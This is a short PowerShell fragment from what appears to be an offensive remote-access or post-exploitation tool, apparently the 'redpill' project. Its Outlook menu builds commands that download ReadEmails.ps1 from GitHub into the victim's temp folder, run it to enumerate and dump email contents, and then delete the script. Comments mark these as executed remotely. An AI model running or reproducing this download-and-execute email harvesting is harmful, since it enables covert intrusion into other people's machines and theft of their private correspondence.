    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "OutLook")
      {
         ...
         If($OutLook_choise -ieq "Emails")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
         }
         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
         {
            ...
            Else
            {
               ...
               Write-Host " - Use verbose reports? (y|n)  : " -NoNewline;
               ...
               #Execute command remotely
               Write-Host " * Scanning OutLook for Email Objects <Info|Body>" -ForegroundColor Green
         ...
         If($OutLook_choise -ieq "FullDump")
         {
            ...
            #Execute command remotely
            Write-Host " * Scanning OutLook Email Objects <Info|Body>" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"True`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"         
         }
